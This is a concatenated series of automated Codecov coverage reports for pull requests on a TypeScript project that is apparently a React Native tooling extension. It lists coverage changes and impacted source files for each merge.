|\n| src/extension/rn-extension.ts | 8.82% <\u00f8> (-1.18%) | :arrow_down: |\n| src/extension/appcenter/appCenterStrings.ts | 0% <0%> (\u00f8) | |\n| src/extension/appcenter/codepush/index.ts | 0% <0%> (\u00f8) | |\n| ...codepush/codepush-sdk/src/update-contents/index.ts | 0% <0%> (\u00f8) | |\n| src/extension/appcenter/auth/auth.ts | 0% <0%> (\u00f8) | |\n| ...nsion/appcenter/codepush/codepush-sdk/src/index.ts | 0% <0%> (\u00f8) | |\n| ...sh/release-strategy/legacyCodePushServiceClient.ts | 0% <0%> (\u00f8) | |\n| ...ension/appcenter/api/appCenterClientCredentials.ts | 0% <0%> (\u00f8) | |\n| ... and 59 more | |\n. # Codecov Report\n\nMerging #687 into master will increase coverage by 3.02%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #687      +/-\n==========================================\n+ Coverage   12.07%   15.09%   +3.02%   \n==========================================\n  Files          93       62      -31   \n  Lines        4490     3134    -1356   \n  Branches      612      406     -206   \n==========================================\n- Hits          542      473      -69   \n+ Misses       3948     2661    -1287\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/settingsHelper.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n| src/common/error/internalErrorCode.ts | 100% <\u00f8> (\u00f8) | :arrow_up: |\n| src/extension/commandPaletteHandler.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n| src/extension/rn-extension.ts | 10% <\u00f8> (+1.17%) | :arrow_up: |\n| src/debugger/nodeDebugWrapper.ts | 3.22% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #689 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #689   +/-\n=======================================\n  Coverage   15.09%   15.09%         \n=======================================\n  Files          62       62         \n  Lines        3134     3134         \n  Branches      406      406         \n=======================================\n  Hits          473      473         \n  Misses       2661     2661\n```\n. # Codecov Report\n\nMerging #692 into master will not change coverage.\nThe diff coverage is 0%.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #692   +/-\n=======================================\n  Coverage   15.09%   15.09%         \n=======================================\n  Files          62       62         \n  Lines        3134     3134         \n  Branches      406      406         \n=======================================\n  Hits          473      473         \n  Misses       2661     2661\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/android/androidPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/windows/windowsPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/outputVerifier.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/ios/iOSPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #697 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #697   +/-\n=======================================\n  Coverage   15.09%   15.09%         \n=======================================\n  Files          62       62         \n  Lines        3134     3134         \n  Branches      406      406         \n=======================================\n  Hits          473      473         \n  Misses       2661     2661\n```\n. # Codecov Report\n\nMerging #699 into master will decrease coverage by 0.02%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #699      +/-\n==========================================\n- Coverage   15.09%   15.06%   -0.03%   \n==========================================\n  Files          62       62            \n  Lines        3134     3133       -1   \n  Branches      406      406            \n==========================================\n- Hits          473      472       -1   \n  Misses       2661     2661\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/telemetry.ts | 4.95% <\u00f8> (-0.69%) | :arrow_down: |\n| src/common/telemetryReporters.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/rn-extension.ts | 9.82% <0%> (-0.18%) | :arrow_down: |\n| src/debugger/nodeDebugWrapper.ts | 3.22% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #700 into master will not change coverage.\nThe diff coverage is 0%.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #700   +/-\n=======================================\n  Coverage   15.06%   15.06%         \n=======================================\n  Files          62       62         \n  Lines        3133     3133         \n  Branches      406      406         \n=======================================\n  Hits          472      472         \n  Misses       2661     2661\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/extensionServer.ts | 3.07% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #701 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #701   +/-\n=======================================\n  Coverage   15.06%   15.06%         \n=======================================\n  Files          62       62         \n  Lines        3133     3133         \n  Branches      406      406         \n=======================================\n  Hits          472      472         \n  Misses       2661     2661\n```\n. # Codecov Report\n\nMerging #704 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #704   +/-\n=======================================\n  Coverage   15.06%   15.06%         \n=======================================\n  Files          62       62         \n  Lines        3133     3133         \n  Branches      406      406         \n=======================================\n  Hits          472      472         \n  Misses       2661     2661\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/error/errorStrings.ts | 100% <\u00f8> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #705 into master will decrease coverage by 0.01%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #705      +/-\n==========================================\n- Coverage   15.06%   15.04%   -0.02%   \n==========================================\n  Files          62       62            \n  Lines        3133     3137       +4   \n  Branches      406      407       +1   \n==========================================\n  Hits          472      472            \n- Misses       2661     2665       +4\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/windows/windowsPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #706 into master will not change coverage.\nThe diff coverage is 0%.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #706   +/-\n=======================================\n  Coverage   15.04%   15.04%         \n=======================================\n  Files          62       62         \n  Lines        3137     3137         \n  Branches      407      407         \n=======================================\n  Hits          472      472         \n  Misses       2665     2665\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/debugger/scriptImporter.ts | 29.41% <0%> (\u00f8) | :arrow_up: |\n| src/extension/android/androidPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/windows/windowsPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/rn-extension.ts | 9.82% <0%> (\u00f8) | :arrow_up: |\n| src/extension/ios/iOSPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #707 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #707   +/-\n=======================================\n  Coverage   15.04%   15.04%         \n=======================================\n  Files          62       62         \n  Lines        3137     3137         \n  Branches      407      407         \n=======================================\n  Hits          472      472         \n  Misses       2665     2665\n```\n. # Codecov Report\n\nMerging #709 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #709   +/-\n=======================================\n  Coverage   15.04%   15.04%         \n=======================================\n  Files          62       62         \n  Lines        3137     3137         \n  Branches      407      407         \n=======================================\n  Hits          472      472         \n  Misses       2665     2665\n```\n. # Codecov Report\n\nMerging #711 into master will decrease coverage by 0.05%.\nThe diff coverage is 5%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #711      +/-\n==========================================\n- Coverage   15.04%   14.98%   -0.06%   \n==========================================\n  Files          62       62            \n  Lines        3137     3149      +12   \n  Branches      407      409       +2   \n==========================================\n  Hits          472      472            \n- Misses       2665     2677      +12\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/extensionServer.ts | 2.91% <0%> (-0.16%) | :arrow_down: |\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/entryPointHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/rn-extension.ts | 9.48% <12.5%> (-0.34%) | :arrow_down: |\n. # Codecov Report\n\nMerging #715 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #715   +/-\n=======================================\n  Coverage   14.98%   14.98%         \n=======================================\n  Files          62       62         \n  Lines        3149     3149         \n  Branches      409      409         \n=======================================\n  Hits          472      472         \n  Misses       2677     2677\n```\n. # Codecov Report\n\nMerging #717 into master will decrease coverage by 0.03%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #717      +/-\n==========================================\n- Coverage   14.98%   14.95%   -0.04%   \n==========================================\n  Files          62       62            \n  Lines        3149     3156       +7   \n  Branches      409      411       +2   \n==========================================\n  Hits          472      472            \n- Misses       2677     2684       +7\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/debugger/nodeDebugWrapper.ts | 3% <0%> (-0.23%) | :arrow_down: |\n. # Codecov Report\n\nMerging #720 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #720   +/-\n=======================================\n  Coverage   14.95%   14.95%         \n=======================================\n  Files          62       62         \n  Lines        3156     3156         \n  Branches      411      411         \n=======================================\n  Hits          472      472         \n  Misses       2684     2684\n```\n. # Codecov Report\n\nMerging #725 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #725   +/-\n=======================================\n  Coverage   14.95%   14.95%         \n=======================================\n  Files          62       62         \n  Lines        3156     3156         \n  Branches      411      411         \n=======================================\n  Hits          472      472         \n  Misses       2684     2684\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/outputVerifier.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #726 into master will decrease coverage by 0.21%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff            @@\nmaster    #726      +/-\n=========================================\n- Coverage   14.91%   14.7%   -0.22%   \n=========================================\n  Files          62      63       +1   \n  Lines        3145    3190      +45   \n  Branches      399     406       +7   \n=========================================\n  Hits          469     469            \n- Misses       2676    2721      +45\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/windows/windowsPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/windows/wpfPlatform.ts | 0% <0%> (\u00f8) | |\n| src/common/targetPlatformHelper.ts | 34.48% <0%> (-1.24%) | :arrow_down: |\n| src/extension/platformResolver.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #731 into master will increase coverage by 0.08%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #731      +/-\n==========================================\n+ Coverage   14.95%   15.04%   +0.08%   \n==========================================\n  Files          62       62            \n  Lines        3156     3118      -38   \n  Branches      411      404       -7   \n==========================================\n- Hits          472      469       -3   \n+ Misses       2684     2649      -35\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/telemetry.ts | 3.61% <0%> (-1.35%) | :arrow_down: |\n. # Codecov Report\n\nMerging #733 into master will not change coverage.\nThe diff coverage is 0%.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #733   +/-\n=======================================\n  Coverage   15.04%   15.04%         \n=======================================\n  Files          62       62         \n  Lines        3118     3118         \n  Branches      404      404         \n=======================================\n  Hits          469      469         \n  Misses       2649     2649\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #734 into master will decrease coverage by <.01%.\nThe diff coverage is 0.57%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #734      +/-\n==========================================\n- Coverage   15.04%   15.03%   -0.01%   \n==========================================\n  Files          62       62            \n  Lines        3118     3119       +1   \n  Branches      404      395       -9   \n==========================================\n  Hits          469      469            \n- Misses       2649     2650       +1\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/error/errorStrings.ts | 100% <\u00f8> (\u00f8) | :arrow_up: |\n| src/extension/rn-extension.ts | 9.48% <0%> (\u00f8) | :arrow_up: |\n| src/extension/exponent/exponentPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/generalMobilePlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/packagerStatusIndicator.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/packager.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/extensionServer.ts | 2.89% <0%> (-0.03%) | :arrow_down: |\n| src/common/error/internalErrorCode.ts | 100% <100%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #735 into master will decrease coverage by 0.12%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #735      +/-\n==========================================\n- Coverage   15.03%   14.91%   -0.13%   \n==========================================\n  Files          62       62            \n  Lines        3119     3145      +26   \n  Branches      395      399       +4   \n==========================================\n  Hits          469      469            \n- Misses       2650     2676      +26\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/rn-extension.ts | 9.4% <\u00f8> (-0.09%) | :arrow_down: |\n| src/extension/ios/iOSPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/windows/windowsPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/debugger/nodeDebugWrapper.ts | 2.97% <0%> (-0.03%) | :arrow_down: |\n| src/extension/android/androidPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/extensionServer.ts | 2.87% <0%> (-0.03%) | :arrow_down: |\n| src/common/telemetryGenerators.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/exponent/exponentPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/entryPointHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/telemetryHelper.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| ... and 2 more | |\n. # Codecov Report\n\nMerging #736 into master will decrease coverage by 0.02%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #736      +/-\n==========================================\n- Coverage    14.7%   14.67%   -0.03%   \n==========================================\n  Files          63       63            \n  Lines        3190     3196       +6   \n  Branches      406      407       +1   \n==========================================\n  Hits          469      469            \n- Misses       2721     2727       +6\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/packager.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #737 into master will not change coverage.\nThe diff coverage is 0%.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #737   +/-\n=======================================\n  Coverage   14.65%   14.65%         \n=======================================\n  Files          63       63         \n  Lines        3200     3200         \n  Branches      407      407         \n=======================================\n  Hits          469      469         \n  Misses       2731     2731\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/error/errorStrings.ts | 100% <\u00f8> (\u00f8) | :arrow_up: |\n| src/extension/rn-extension.ts | 9.4% <\u00f8> (\u00f8) | :arrow_up: |\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #738 into master will decrease coverage by 0.01%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #738      +/-\n==========================================\n- Coverage   14.67%   14.65%   -0.02%   \n==========================================\n  Files          63       63            \n  Lines        3196     3200       +4   \n  Branches      407      407            \n==========================================\n  Hits          469      469            \n- Misses       2727     2731       +4\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/telemetry.ts | 3.61% <\u00f8> (\u00f8) | :arrow_up: |\n| src/extension/extensionServer.ts | 2.83% <0%> (-0.05%) | :arrow_down: |\n| src/debugger/reactNativeDebugEntryPoint.ts | 5.55% <0%> (\u00f8) | :arrow_up: |\n| src/common/remoteExtension.ts | 50% <0%> (-3.34%) | :arrow_down: |\n. # Codecov Report\n\nMerging #739 into master will not change coverage.\nThe diff coverage is 0%.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #739   +/-\n=======================================\n  Coverage   14.65%   14.65%         \n=======================================\n  Files          63       63         \n  Lines        3200     3200         \n  Branches      407      407         \n=======================================\n  Hits          469      469         \n  Misses       2731     2731\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/settingsHelper.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #740 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #740   +/-\n=======================================\n  Coverage   14.65%   14.65%         \n=======================================\n  Files          63       63         \n  Lines        3200     3200         \n  Branches      407      407         \n=======================================\n  Hits          469      469         \n  Misses       2731     2731\n```\n. # Codecov Report\n\nMerging #745 into master will increase coverage by <.01%.\nThe diff coverage is n/a.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #745      +/-\n==========================================\n+ Coverage   14.65%   14.66%   +<.01%   \n==========================================\n  Files          63       63            \n  Lines        3200     3198       -2   \n  Branches      407      406       -1   \n==========================================\n  Hits          469      469            \n+ Misses       2731     2729       -2\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/packager.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #746 into master will not change coverage.\nThe diff coverage is 0%.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #746   +/-\n=======================================\n  Coverage   14.65%   14.65%         \n=======================================\n  Files          63       63         \n  Lines        3200     3200         \n  Branches      407      407         \n=======================================\n  Hits          469      469         \n  Misses       2731     2731\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/reactNativeProjectHelper.ts | 25% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #748 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #748   +/-\n=======================================\n  Coverage   14.66%   14.66%         \n=======================================\n  Files          63       63         \n  Lines        3198     3198         \n  Branches      406      406         \n=======================================\n  Hits          469      469         \n  Misses       2729     2729\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/debugger/appWorker.ts | 76.52% <\u00f8> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #750 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #750   +/-\n=======================================\n  Coverage   14.66%   14.66%         \n=======================================\n  Files          63       63         \n  Lines        3198     3198         \n  Branches      406      406         \n=======================================\n  Hits          469      469         \n  Misses       2729     2729\n```\n. # Codecov Report\n\nMerging #753 into master will decrease coverage by 0.04%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #753      +/-\n==========================================\n- Coverage   14.66%   14.61%   -0.05%   \n==========================================\n  Files          63       63            \n  Lines        3198     3208      +10   \n  Branches      406      409       +3   \n==========================================\n  Hits          469      469            \n- Misses       2729     2739      +10\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/packager.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/exponent/exponentHelper.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #754 into master will decrease coverage by 0.16%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #754      +/-\n==========================================\n- Coverage   14.61%   14.45%   -0.17%   \n==========================================\n  Files          63       63            \n  Lines        3208     3244      +36   \n  Branches      409      416       +7   \n==========================================\n  Hits          469      469            \n- Misses       2739     2775      +36\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/ios/iOSPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/android/androidPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/android/adb.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/android/logCatMonitor.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #759 into master will decrease coverage by 0.06%.\nThe diff coverage is 4.54%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #759      +/-\n==========================================\n- Coverage   14.45%   14.39%   -0.07%   \n==========================================\n  Files          63       63            \n  Lines        3244     3259      +15   \n  Branches      416      416            \n==========================================\n  Hits          469      469            \n- Misses       2775     2790      +15\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/debugger/nodeDebugWrapper.ts | 2.91% <0%> (-0.06%) | :arrow_down: |\n| src/extension/rn-extension.ts | 8.73% <12.5%> (-0.68%) | :arrow_down: |\n. # Codecov Report\n\n:exclamation: No coverage uploaded for pull request base (master@46e2461). Click here to learn what that means.\nThe diff coverage is 66.66%.\n\n```diff\n@@            Coverage Diff            @@\nmaster     #760   +/-\n=========================================\n  Coverage          ?   14.39%         \n=========================================\n  Files             ?       63         \n  Lines             ?     3259         \n  Branches          ?      416         \n=========================================\n  Hits              ?      469         \n  Misses            ?     2790         \n  Partials          ?        0\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/debugger/nodeDebugWrapper.ts | 2.91% <0%> (\u00f8) | |\n| src/debugger/forkedAppWorker.ts | 86.56% <100%> (\u00f8) | |\n. # Codecov Report\n\nMerging #761 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #761   +/-\n=======================================\n  Coverage   14.39%   14.39%         \n=======================================\n  Files          63       63         \n  Lines        3259     3259         \n  Branches      416      416         \n=======================================\n  Hits          469      469         \n  Misses       2790     2790\n```\n. # Codecov Report\n\nMerging #763 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #763   +/-\n=======================================\n  Coverage   14.39%   14.39%         \n=======================================\n  Files          63       63         \n  Lines        3259     3259         \n  Branches      416      416         \n=======================================\n  Hits          469      469         \n  Misses       2790     2790\n```\n. # Codecov Report\n\nMerging #765 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #765   +/-\n=======================================\n  Coverage   14.39%   14.39%         \n=======================================\n  Files          63       63         \n  Lines        3259     3259         \n  Branches      416      416         \n=======================================\n  Hits          469      469         \n  Misses       2790     2790\n```\n. # Codecov Report\n\nMerging #766 into master will decrease coverage by 0.06%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #766      +/-\n==========================================\n- Coverage   14.39%   14.32%   -0.07%   \n==========================================\n  Files          63       62       -1   \n  Lines        3259     3273      +14   \n  Branches      416      427      +11   \n==========================================\n  Hits          469      469            \n- Misses       2790     2804      +14\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/windows/wpfPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/generalMobilePlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/exponent/exponentPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/android/androidPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/extensionServer.ts | 2.79% <0%> (-0.04%) | :arrow_down: |\n| src/extension/ios/simulatorPlist.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/ios/iOSDebugModeManager.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/windows/windowsPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/ios/iOSPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/ios/plistBuddy.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #768 into master will increase coverage by 0.01%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #768      +/-\n==========================================\n+ Coverage   14.32%   14.34%   +0.01%   \n==========================================\n  Files          62       62            \n  Lines        3273     3270       -3   \n  Branches      427      425       -2   \n==========================================\n  Hits          469      469            \n+ Misses       2804     2801       -3\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/ios/iOSPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #771 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #771   +/-\n=======================================\n  Coverage   14.32%   14.32%         \n=======================================\n  Files          62       62         \n  Lines        3273     3273         \n  Branches      427      427         \n=======================================\n  Hits          469      469         \n  Misses       2804     2804\n```\n. # Codecov Report\n\nMerging #775 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #775   +/-\n=======================================\n  Coverage   14.32%   14.32%         \n=======================================\n  Files          62       62         \n  Lines        3273     3273         \n  Branches      427      427         \n=======================================\n  Hits          469      469         \n  Misses       2804     2804\n```\n. # Codecov Report\n\nMerging #779 into master will decrease coverage by 0.01%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #779      +/-\n==========================================\n- Coverage   14.32%   14.31%   -0.02%   \n==========================================\n  Files          62       62            \n  Lines        3273     3276       +3   \n  Branches      427      427            \n==========================================\n  Hits          469      469            \n- Misses       2804     2807       +3\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/ios/iOSPlatform.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n| src/extension/generalMobilePlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/android/androidPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #780 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #780   +/-\n=======================================\n  Coverage   14.31%   14.31%         \n=======================================\n  Files          62       62         \n  Lines        3276     3276         \n  Branches      427      427         \n=======================================\n  Hits          469      469         \n  Misses       2807     2807\n```\n. # Codecov Report\n\nMerging #782 into master will increase coverage by 0.34%.\nThe diff coverage is 1.29%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #782      +/-\n==========================================\n+ Coverage   14.31%   14.66%   +0.34%   \n==========================================\n  Files          62       63       +1   \n  Lines        3276     3198      -78   \n  Branches      427      406      -21   \n==========================================\n  Hits          469      469            \n+ Misses       2807     2729      -78\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/exponent/exponentPlatform.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n| src/extension/extensionServer.ts | 2.83% <\u00f8> (+0.03%) | :arrow_up: |\n| src/extension/rn-extension.ts | 9.4% <\u00f8> (+0.67%) | :arrow_up: |\n| src/debugger/nodeDebugWrapper.ts | 2.97% <\u00f8> (+0.05%) | :arrow_up: |\n| src/extension/generalMobilePlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/ios/xcodeproj.ts | 0% <0%> (\u00f8) | |\n| src/extension/android/androidPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/android/adb.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/android/logCatMonitor.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| ... and 11 more | |\n. # Codecov Report\n\n:exclamation: No coverage uploaded for pull request base (master@634e3ec). Click here to learn what that means.\nThe diff coverage is n/a.\n\n```diff\n@@            Coverage Diff            @@\nmaster     #783   +/-\n=========================================\n  Coverage          ?   14.66%         \n=========================================\n  Files             ?       63         \n  Lines             ?     3198         \n  Branches          ?      406         \n=========================================\n  Hits              ?      469         \n  Misses            ?     2729         \n  Partials          ?        0\n```\n. # Codecov Report\n\nMerging #785 into master will decrease coverage by 0.34%.\nThe diff coverage is 1.29%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #785      +/-\n==========================================\n- Coverage   14.66%   14.31%   -0.35%   \n==========================================\n  Files          63       62       -1   \n  Lines        3198     3276      +78   \n  Branches      406      427      +21   \n==========================================\n  Hits          469      469            \n- Misses       2729     2807      +78\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/generalMobilePlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/exponent/exponentPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/android/androidPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/android/adb.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/android/logCatMonitor.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/ios/iOSDebugModeManager.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/ios/plistBuddy.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/windows/windowsPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/exponent/exponentHelper.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| ... and 9 more | |\n. # Codecov Report\n\nMerging #786 into master will not change coverage.\nThe diff coverage is 100%.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #786   +/-\n=======================================\n  Coverage   14.31%   14.31%         \n=======================================\n  Files          62       62         \n  Lines        3276     3276         \n  Branches      427      427         \n=======================================\n  Hits          469      469         \n  Misses       2807     2807\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| 